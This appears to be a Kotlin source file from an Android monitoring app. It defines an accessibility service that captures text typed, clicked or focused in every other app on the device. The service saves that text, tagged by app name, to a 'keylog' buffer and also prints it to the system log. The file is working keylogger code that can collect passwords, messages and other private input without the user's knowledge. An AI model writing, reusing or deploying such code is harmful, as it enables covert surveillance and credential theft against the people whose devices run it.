package com.sentinel.host.service

import android.accessibilityservice.AccessibilityService
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.sentinel.host.data.device.SentinelLogBuffer

class SentinelAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "Sentinel:AccessService"

        @Volatile
        var instance: SentinelAccessibilityService? = null
            private set
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        Log.i(TAG, "SentinelAccessibilityService connected successfully")
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance == this) instance = null
        Log.i(TAG, "SentinelAccessibilityService destroyed")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            val packageName = event.packageName?.toString() ?: "unknown"
            if (packageName == applicationContext.packageName) return

            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = event.text.joinToString("")
                    if (text.isNotBlank()) {
                        SentinelLogBuffer.instance.addKeylog(packageName, text)
                        Log.d(TAG, "Keylog captured from [$packageName]: $text")
                    }
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED, AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    val text = event.text.joinToString("")
                    if (text.isNotBlank() && text.length > 2) {
                        SentinelLogBuffer.instance.addKeylog(packageName, "[Clicked/Focused] $text")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing accessibility event: ${e.message}", e)
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "SentinelAccessibilityService interrupted")
    }
}
